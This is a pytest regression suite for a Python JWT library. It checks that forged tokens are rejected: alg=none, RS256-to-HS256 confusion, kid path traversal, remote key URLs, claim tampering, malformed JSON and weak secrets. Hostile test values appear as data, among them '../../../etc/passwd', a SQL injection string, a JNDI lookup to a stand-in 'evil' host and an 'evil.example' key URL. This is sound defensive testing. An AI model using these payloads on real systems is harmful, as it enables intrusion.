"""Known JWT vulnerabilities and exploit patterns, expressed as regression tests."""

import hmac
import json
import socket
import time
from collections import OrderedDict

import pytest

from easy_jwt import (
    JWTSettings,
    issue_access_token,
    issue_refresh_token,
    parse_token,
    renew_access_token,
    verify_token,
)
from easy_jwt.exceptions import (
    ExpiredToken,
    InvalidPayload,
    InvalidSettings,
    TokenException,
)

from .helpers import (
    B64URL_ALPHABET,
    NOW,
    SECRET,
    b64,
    decode_part,
    forge,
    hs_sign,
    jdump,
    make_settings,
    split,
    valid_claims,
)

pytestmark = pytest.mark.usefixtures("clock")


def rejected(token, settings, kind="access", exc=TokenException):
    with pytest.raises(exc):
        parse_token(token, token_type=kind, settings=settings)
    assert verify_token(token, token_type=kind, settings=settings) is False


# =========================================================== CVE-2015-9235 family: alg=none
class TestAlgNone:
    @pytest.mark.parametrize(
        "alg", ["none", "None", "NONE", "nOnE", "none ", " none", "\x00none"]
    )
    @pytest.mark.parametrize("signature", ["", None])
    def test_unsecured_jwt_variants(self, alg, signature, settings):
        h = b64(jdump({"typ": "JWT", "alg": alg}))
        p = b64(jdump(valid_claims(sub="admin")))
        token = f"{h}.{p}.{'' if signature == '' else hs_sign(f'{h}.{p}')}"
        rejected(token, settings)

    def test_none_with_dropped_signature_part(self, settings):
        h = b64(jdump({"alg": "none"}))
        p = b64(jdump(valid_claims()))
        rejected(f"{h}.{p}", settings)
        rejected(f"{h}.{p}.", settings)

    def test_alg_none_even_with_a_cryptographically_valid_hmac(self, settings):
        rejected(forge({"typ": "JWT", "alg": "none"}), settings)

    def test_alg_header_is_never_used_to_pick_the_verifier(self, settings):
        # the secret is used with the *configured* algorithm no matter what the header claims
        token = forge({"typ": "JWT", "alg": "HS512"}, sign_alg="HS512")
        rejected(token, settings)


# =========================================================== algorithm confusion / downgrade
PEM_PUBLIC_KEY = (
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n"
    "4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n"
    "-----END PUBLIC KEY-----\n"
)


class TestAlgorithmConfusion:
    @pytest.mark.parametrize(
        "alg", ["RS256", "RS384", "RS512", "ES256", "PS256", "EdDSA"]
    )
    def test_asymmetric_alg_header_with_hmac_signature(self, alg, settings):
        # classic RS256->HS256 confusion: attacker HMACs with the *public key* as the secret
        token = forge({"typ": "JWT", "alg": alg}, secret=PEM_PUBLIC_KEY)
        rejected(token, settings)

    def test_public_key_used_as_hmac_secret_is_not_the_server_secret(self, settings):
        rejected(forge(secret=PEM_PUBLIC_KEY), settings)

    @pytest.mark.parametrize(
        ("configured", "attacker"),
        [
            ("HS512", "HS256"),
            ("HS512", "HS384"),
            ("HS384", "HS256"),
            ("HS256", "HS512"),
            ("HS256", "HS384"),
            ("HS384", "HS512"),
        ],
    )
    def test_downgrade_and_upgrade_between_hmac_variants(self, configured, attacker):
        s = make_settings(configured)
        token = forge({"typ": "JWT", "alg": attacker}, sign_alg=attacker)
        rejected(token, s)

    def test_header_alg_matches_but_signature_made_with_other_digest(self):
        s = make_settings("HS512")
        rejected(forge({"typ": "JWT", "alg": "HS512"}, sign_alg="HS256"), s)

    def test_alg_case_variants(self, settings):
        for alg in ("hs256", "Hs256", "HS-256", "HS256\n", "HS256\x00"):
            rejected(forge({"typ": "JWT", "alg": alg}), settings)

    def test_settings_cannot_be_configured_with_unsafe_algorithms(self):
        for alg in ("none", "RS256", None, ""):
            with pytest.raises(InvalidSettings):
                make_settings(alg)


# =========================================================== signature tampering / malleability
class TestSignatureTampering:
    @pytest.fixture
    def token(self, settings):
        return issue_refresh_token("alice", {"role": "user"}, settings=settings)[0]

    def test_every_single_character_substitution_is_rejected(self, token, settings):
        for i, original in enumerate(token):
            if original == ".":
                continue
            for repl in "AaZz09-_":
                if repl == original:
                    continue
                rejected(token[:i] + repl + token[i + 1 :], settings, "refresh")

    def test_every_truncation_is_rejected(self, token, settings):
        for n in range(len(token)):
            rejected(token[:n], settings, "refresh")

    @pytest.mark.parametrize(
        "suffix", ["A", "=", "==", ".", ".x", "\n", " ", "\x00", "AAAA"]
    )
    def test_every_extension_is_rejected(self, token, suffix, settings):
        rejected(token + suffix, settings, "refresh")

    @pytest.mark.parametrize(
        "prefix", [" ", "\n", "Bearer ", "bearer ", "JWT ", "\ufeff"]
    )
    def test_prefixes_are_rejected(self, token, prefix, settings):
        rejected(prefix + token, settings, "refresh")

    def test_malleable_signature_encodings_are_rejected(self, token, settings):
        # base64url malleability: change only the unused trailing bits of the signature's last char.
        h, p, s = split(token)
        last = B64URL_ALPHABET.index(s[-1])
        assert last & 0x03 == 0  # canonical form has zero pad bits
        for variant in (1, 2, 3):
            forged = f"{h}.{p}.{s[:-1]}{B64URL_ALPHABET[last | variant]}"
            rejected(forged, settings, "refresh")

    def test_signature_of_wrong_length(self, token, settings):
        h, p, s = split(token)
        raw = decode_part(s)
        for blob in (b"", raw[:1], raw[:-1], raw + b"\x00", raw * 2, b"\x00" * 32):
            rejected(f"{h}.{p}.{b64(blob)}", settings, "refresh")

    def test_payload_swapped_between_tokens(self, settings):
        a = issue_refresh_token("alice", settings=settings)[0]
        b = issue_refresh_token("admin", {"role": "admin"}, settings=settings)[0]
        ha, _, sa = split(a)
        _, pb, _ = split(b)
        rejected(f"{ha}.{pb}.{sa}", settings, "refresh")

    def test_header_swapped_between_tokens(self, settings):
        a = issue_refresh_token("alice", settings=settings)[0]
        _, pa, sa = split(a)
        evil = b64(jdump({"typ": "JWT", "alg": "HS256", "kid": "x"}))
        rejected(f"{evil}.{pa}.{sa}", settings, "refresh")

    def test_privilege_escalation_by_reencoding_payload(self, settings):
        h, p, s = split(
            issue_refresh_token("alice", {"role": "user"}, settings=settings)[0]
        )
        claims = json.loads(decode_part(p))
        claims["role"] = "admin"
        rejected(f"{h}.{b64(jdump(claims))}.{s}", settings, "refresh")

    def test_extending_expiry_by_editing_exp(self, settings):
        h, _, s = split(forge())
        rejected(f"{h}.{b64(jdump(valid_claims(exp=NOW + 10**9)))}.{s}", settings)

    def test_signature_from_a_different_secret(self, settings):
        rejected(forge(secret="x" * 64), settings)
        rejected(forge(secret=""), settings)


# =========================================================== header injection
class TestHeaderInjection:
    @pytest.mark.parametrize(
        "kid",
        [
            "../../../../dev/null",
            "/dev/null",
            "' OR '1'='1",
            "1; DROP TABLE keys;--",
            "../../../etc/passwd",
            "\x00",
            "${jndi:ldap://evil/a}",
        ],
    )
    def test_kid_cannot_select_a_different_key(self, kid, settings):
        # CVE-2018-0114 / "kid path traversal": the attacker signs with the key the kid would select
        # (an empty file -> empty HMAC key, or a known file's contents)
        for key in ("", "\n", "a"):
            rejected(
                forge({"typ": "JWT", "alg": "HS256", "kid": kid}, secret=key), settings
            )

    def test_kid_is_ignored_when_signature_is_valid(self, settings):
        token = forge({"typ": "JWT", "alg": "HS256", "kid": "../../dev/null"})
        assert (
            parse_token(token, token_type="access", settings=settings).sub == "user-1"
        )

    def test_embedded_jwk_is_never_trusted(self, settings):
        attacker_key = "attacker-key-attacker-key-attacker-key"
        header = {
            "typ": "JWT",
            "alg": "HS256",
            "jwk": {"kty": "oct", "k": b64(attacker_key.encode())},
        }
        rejected(forge(header, secret=attacker_key), settings)

    @pytest.mark.parametrize("name", ["jku", "x5u"])
    def test_remote_key_urls_are_never_fetched(self, name, settings, monkeypatch):
        def no_network(*a, **k):
            raise AssertionError("network access attempted while validating a token")

        monkeypatch.setattr(socket, "getaddrinfo", no_network)
        monkeypatch.setattr(socket.socket, "connect", no_network)
        header = {"typ": "JWT", "alg": "HS256", name: "https://evil.example/keys.json"}
        rejected(forge(header, secret="attacker" * 8), settings)
        assert parse_token(
            forge(header), token_type="access", settings=settings
        )  # ignored

    def test_x5c_chain_is_never_trusted(self, settings):
        header = {"typ": "JWT", "alg": "HS256", "x5c": ["MIIB"]}
        rejected(forge(header, secret="attacker" * 8), settings)

    @pytest.mark.parametrize("crit", [["exp"], ["b64"], ["unknown-ext"], []])
    def test_crit_extensions_are_rejected(self, crit, settings):
        # CVE-2021-... style "crit bypass": unknown critical headers must never be silently ignored
        rejected(
            forge({"typ": "JWT", "alg": "HS256", "crit": crit, "unknown-ext": 1}),
            settings,
        )

    def test_unencoded_payload_b64_false_is_not_supported(self, settings):
        # RFC 7797 "b64": false would change what is signed; "crit" must make this fail
        header = {"typ": "JWT", "alg": "HS256", "b64": False, "crit": ["b64"]}
        rejected(forge(header), settings)

    def test_nested_jwt_via_cty_is_rejected(self, settings):
        rejected(forge({"typ": "JWT", "alg": "HS256", "cty": "JWT"}), settings)

    @pytest.mark.parametrize(
        "typ", ["JWE", "secevent+jwt", "dpop+jwt", "at+jwt", "x" * 1000]
    )
    def test_cross_protocol_typ_confusion(self, typ, settings):
        rejected(forge({"typ": typ, "alg": "HS256"}), settings)

    def test_duplicate_alg_header_is_rejected(self, settings):
        # parser-differential: one parser keeps the first 'alg', another the last
        for raw in (b'{"alg":"none","alg":"HS256"}', b'{"alg":"HS256","alg":"none"}'):
            rejected(forge(raw), settings)


# =========================================================== claim-level attacks
class TestClaimAttacks:
    def test_expired_token(self, clock, settings):
        token = forge()
        clock.advance(10_000)
        rejected(token, settings, exc=ExpiredToken)

    def test_expired_token_cannot_be_resurrected_by_resigning_without_secret(
        self, clock, settings
    ):
        h, _, s = split(forge())
        rejected(f"{h}.{b64(jdump(valid_claims(exp=NOW + 10**9)))}.{s}", settings)

    def test_token_not_yet_valid(self, settings):
        rejected(forge(payload=valid_claims(nbf=NOW + 3600)), settings)

    def test_exp_before_nbf(self, settings):
        rejected(
            forge(payload=valid_claims(nbf=NOW + 400, exp=NOW + 300)),
            settings,
            exc=InvalidPayload,
        )

    @pytest.mark.parametrize(
        "iss", ["attacker", "TEST-ISSUER", "test-issuer\n", "", None, ["test-issuer"]]
    )
    def test_foreign_issuer(self, iss, settings):
        rejected(forge(payload=valid_claims(iss=iss)), settings, exc=InvalidPayload)

    @pytest.mark.parametrize(
        "aud",
        [
            "other-service",
            "TEST-AUDIENCE",
            "",
            None,
            ["test-audience"],
            ["other", "test-audience"],
        ],
    )
    def test_foreign_audience_cross_service_relay(self, aud, settings):
        rejected(forge(payload=valid_claims(aud=aud)), settings, exc=InvalidPayload)

    def test_token_from_another_deployment_with_same_secret(self, settings):
        # same secret, different iss/aud -> must not be accepted ("confused deputy")
        other = make_settings(issuer="other-issuer", audience="other-audience")
        token, _ = issue_access_token("alice", settings=other)
        rejected(token, settings, exc=InvalidPayload)

    @pytest.mark.parametrize(
        ("issued", "expected"), [("access", "refresh"), ("refresh", "access")]
    )
    def test_token_type_confusion(self, issued, expected, settings):
        issue = issue_access_token if issued == "access" else issue_refresh_token
        rejected(issue("alice", settings=settings)[0], settings, expected)

    @pytest.mark.parametrize(
        "claimed", ["refresh", "ACCESS", "admin", None, ["access"], 1]
    )
    def test_forged_token_type_claim(self, claimed, settings):
        rejected(forge(payload=valid_claims(token_type=claimed)), settings)

    def test_access_token_cannot_mint_new_tokens(self, settings):
        access, _ = issue_access_token("alice", settings=settings)
        with pytest.raises(TokenException):
            renew_access_token(access, settings=settings)

    def test_renewed_token_never_outlives_the_refresh_token(self, clock, settings):
        refresh, _ = issue_refresh_token("alice", settings=settings)
        clock.advance(settings.refresh_ttl - 5)
        access, _ = renew_access_token(refresh, settings=settings)
        assert (
            parse_token(access, token_type="access", settings=settings).exp
            <= NOW + settings.refresh_ttl
        )
        clock.advance(5)
        rejected(access, settings, exc=ExpiredToken)

    @pytest.mark.parametrize(
        "name", ["exp", "iat", "nbf", "sub", "iss", "aud", "jti", "token_type"]
    )
    def test_custom_claims_cannot_override_registered_claims(self, name, settings):
        for issue in (issue_access_token, issue_refresh_token):
            with pytest.raises(InvalidPayload):
                issue(
                    "alice", {name: "x" if name != "exp" else 10**12}, settings=settings
                )

    def test_custom_claims_cannot_smuggle_reserved_names_via_odd_mappings(
        self, settings
    ):
        with pytest.raises(InvalidPayload):
            issue_refresh_token(
                "alice", OrderedDict([("sub", "admin")]), settings=settings
            )

    @pytest.mark.parametrize("value", [1.5, True, "1700000300", None, [], {}])
    def test_exp_type_confusion_never_yields_a_valid_token(self, value, settings):
        # a non-integer 'exp' ("never expires" tricks, truthy values, strings) must never be accepted
        rejected(forge(payload=valid_claims(exp=value)), settings)

    @pytest.mark.parametrize("value", [None, [], {}, "", False, 0, True])
    def test_subject_confusion(self, value, settings):
        rejected(forge(payload=valid_claims(sub=value)), settings, exc=InvalidPayload)

    def test_far_future_exp_is_not_special(self, settings):
        # 2**63 etc. must not overflow or wrap into the past
        token = forge(payload=valid_claims(exp=2**63))
        assert parse_token(token, token_type="access", settings=settings).exp == 2**63

    def test_tokens_have_unique_jti(self, settings):
        assert (
            len({issue_access_token("a", settings=settings)[1] for _ in range(100)})
            == 100
        )


# =========================================================== JSON parser attacks
def signed_payload(raw: bytes):
    return forge(payload=raw)


BASE = jdump(valid_claims())[
    :-1
]  # '{"jti":...,"token_type":"access"' without closing brace


class TestJsonParserAttacks:
    @pytest.mark.parametrize(
        "extra",
        [
            b',"sub":"admin"}',
            b',"exp":9999999999}',
            b',"iss":"evil"}',
            b',"token_type":"refresh"}',
        ],
    )
    def test_duplicate_claim_names_parser_differential(self, extra, settings):
        # {"sub":"user","sub":"admin"}: one parser keeps the first, another the last
        rejected(signed_payload(BASE + extra), settings, exc=InvalidPayload)

    @pytest.mark.parametrize(
        "value", [b"NaN", b"Infinity", b"-Infinity", b"1e999", b"-1e999"]
    )
    @pytest.mark.parametrize("claim", ["exp", "nbf", "iat"])
    def test_non_finite_numbers_in_dates(self, claim, value, settings):
        claims = valid_claims()
        raw = jdump(claims).replace(
            f'"{claim}":{claims[claim]}'.encode(), f'"{claim}":'.encode() + value
        )
        assert value in raw
        rejected(signed_payload(raw), settings, exc=InvalidPayload)

    def test_huge_integer_does_not_cause_dos(self, settings):
        huge = b"9" * 5000
        raw = BASE + b',"x":' + huge + b"}"
        start = time.perf_counter()
        rejected(signed_payload(raw), settings, exc=InvalidPayload)
        assert time.perf_counter() - start < 2.0

    def test_huge_exp(self, settings):
        claims = valid_claims()
        raw = jdump(claims).replace(
            f'"exp":{claims["exp"]}'.encode(), b'"exp":' + b"9" * 4301
        )
        rejected(signed_payload(raw), settings, exc=InvalidPayload)

    @pytest.mark.parametrize("shape", ["list", "dict"])
    def test_deeply_nested_claims_do_not_crash_the_process(self, shape, settings):
        depth = 100_000
        nested = (
            b"[" * depth + b"]" * depth
            if shape == "list"
            else b'{"a":' * depth + b"1" + b"}" * depth
        )
        raw = BASE + b',"x":' + nested + b"}"
        rejected(signed_payload(raw), settings, exc=InvalidPayload)

    @pytest.mark.parametrize("claim", ["sub", "jti"])
    def test_lone_surrogate_in_string_claim(self, claim, settings):
        claims = valid_claims()
        raw = jdump(claims).replace(
            f'"{claim}":"{claims[claim]}"'.encode(), f'"{claim}":"\\ud800"'.encode()
        )
        rejected(signed_payload(raw), settings, exc=InvalidPayload)

    def test_lone_surrogate_in_claim_name(self, settings):
        rejected(signed_payload(BASE + b',"\\udfff":1}'), settings, exc=InvalidPayload)

    @pytest.mark.parametrize(
        "raw",
        [
            b"\xef\xbb\xbf" + jdump(valid_claims()),
            b"\xff\xfe{}",
            b"\xc0\xaf",
            jdump(valid_claims()) + b"garbage",
            jdump(valid_claims()) + b"{}",
            b"\x00" + jdump(valid_claims()),
            jdump(valid_claims()).replace(b'"', b"'"),
        ],
    )
    def test_encoding_and_trailing_data_tricks(self, raw, settings):
        rejected(signed_payload(raw), settings, exc=InvalidPayload)

    def test_comments_and_trailing_commas_are_not_json(self, settings):
        rejected(signed_payload(BASE + b",}"), settings, exc=InvalidPayload)
        rejected(
            signed_payload(b"/*x*/" + jdump(valid_claims())),
            settings,
            exc=InvalidPayload,
        )

    def test_very_large_token_is_rejected_quickly(self, settings):
        start = time.perf_counter()
        assert (
            verify_token(
                "A" * 2_000_000 + ".B.C", token_type="access", settings=settings
            )
            is False
        )
        assert (
            verify_token("." * 100_000, token_type="access", settings=settings) is False
        )
        assert time.perf_counter() - start < 5.0

    def test_header_json_tricks(self, settings):
        for raw in (
            b'{"alg":"HS256","alg":"HS256"}',
            b'{"alg":"HS256"}garbage',
            b"\xef\xbb\xbf{}",
            b'{"alg":"\\ud800"}',
            b'{"alg":NaN}',
        ):
            rejected(forge(raw), settings)


# =========================================================== weak secrets
WEAK_SECRETS = [
    "",
    " ",
    "secret",
    "password",
    "changeme",
    "a" * 64,
    "0" * 64,
    " " * 64,
    "\x00" * 64,
    "ab" * 32,
    "a" * 31,
    "aaaaaaaaaaaaaaaabbbbbbbbbbbbbbbb",
    "12345678901234567890123456789012"[:20],
]


class TestWeakSecrets:
    @pytest.mark.parametrize("secret", WEAK_SECRETS)
    @pytest.mark.parametrize("alg", ["HS256", "HS384", "HS512"])
    def test_weak_secret_rejected(self, secret, alg):
        with pytest.raises(InvalidSettings):
            make_settings(alg, secret=secret)

    def test_weak_secret_rejected_from_environment(self, env, monkeypatch):
        monkeypatch.setenv("JWT_SECRET", "password")
        with pytest.raises(InvalidSettings):
            JWTSettings.from_env()

    def test_secret_shorter_than_hash_for_stronger_algorithms(self):
        # a 32-byte secret is fine for HS256 but not for HS512 (RFC 7518 §3.2)
        assert make_settings("HS256", secret=SECRET[:32])
        with pytest.raises(InvalidSettings):
            make_settings("HS512", secret=SECRET[:32])

    def test_non_string_secrets(self):
        for secret in (None, b"x" * 64, 1234, ["x"] * 64):
            with pytest.raises(TypeError):
                make_settings(secret=secret)

    def test_secret_never_appears_in_repr_str_or_format(self, settings):
        for text in (
            repr(settings),
            str(settings),
            f"{settings}",
            "%s" % settings,
            "{}".format(settings),
        ):
            assert SECRET not in text

    def test_secret_never_appears_in_exception_messages(self, settings):
        attempts = [
            lambda: parse_token(
                forge(secret="x" * 64), token_type="access", settings=settings
            ),
            lambda: parse_token("a.b.c", token_type="access", settings=settings),
            lambda: make_settings(secret="short"),
            lambda: make_settings(secret="a" * 40),
        ]
        for attempt in attempts:
            with pytest.raises((TokenException, InvalidSettings)) as info:
                attempt()
            assert SECRET not in str(info.value)
            assert "a" * 40 not in str(info.value)


# =========================================================== timing side channels / oracles
class TestTimingAndOracles:
    def test_signature_comparison_is_constant_time(self, settings, monkeypatch):
        calls = []
        real = hmac.compare_digest

        def spy(a, b):
            calls.append((a, b))
            return real(a, b)

        monkeypatch.setattr(hmac, "compare_digest", spy)
        parse_token(forge(), token_type="access", settings=settings)
        assert len(calls) == 1
        a, b = calls[0]
        assert isinstance(a, bytes) and isinstance(b, bytes) and len(a) == len(b) == 32

    def test_invalid_signatures_are_compared_with_compare_digest_too(
        self, settings, monkeypatch
    ):
        calls = []
        real = hmac.compare_digest
        monkeypatch.setattr(
            hmac, "compare_digest", lambda a, b: calls.append(1) or real(a, b)
        )
        rejected(forge(secret="y" * 64), settings)
        assert calls

    def test_error_does_not_reveal_how_close_the_signature_was(self, settings):
        h, p, s = split(forge())
        raw_sigs = [
            s[:-2] + "AA",  # differs only at the end
            "A" + s[1:],  # differs at the start
            b64(b"\x00" * 32),
        ]
        messages = set()
        for sig in raw_sigs:
            with pytest.raises(TokenException) as info:
                parse_token(f"{h}.{p}.{sig}", token_type="access", settings=settings)
            messages.add((type(info.value), str(info.value)))
        assert len(messages) == 1

    def test_bad_signature_masks_payload_errors(self, settings):
        # no oracle about payload validity for unauthenticated callers
        good = forge(payload=valid_claims(sub=""), secret="q" * 64)
        bad = forge(payload=b"not json", secret="q" * 64)
        errors = []
        for token in (good, bad):
            with pytest.raises(TokenException) as info:
                parse_token(token, token_type="access", settings=settings)
            errors.append((type(info.value), str(info.value)))
        assert errors[0] == errors[1] == (TokenException, "Invalid signature")

    def test_verify_token_hides_the_reason(self, settings):
        assert {
            verify_token(t, token_type="access", settings=settings)
            for t in ("", "a.b.c", forge(secret="z" * 64), forge({"alg": "none"}))
        } == {False}


# =========================================================== hostile input to verify_token
@pytest.mark.parametrize(
    "token",
    [
        "\x00" * 10,
        "😀.😀.😀",
        "..",
        "a.b.c\x00",
        "%s" * 100,
        "{{7*7}}.a.b",
        "../../etc/passwd",
        "a" * 100_000,
        "\n\n\n",
        "x\u2028y",
    ],
)
def test_verify_token_survives_hostile_strings(token, settings):
    assert verify_token(token, token_type="access", settings=settings) is False
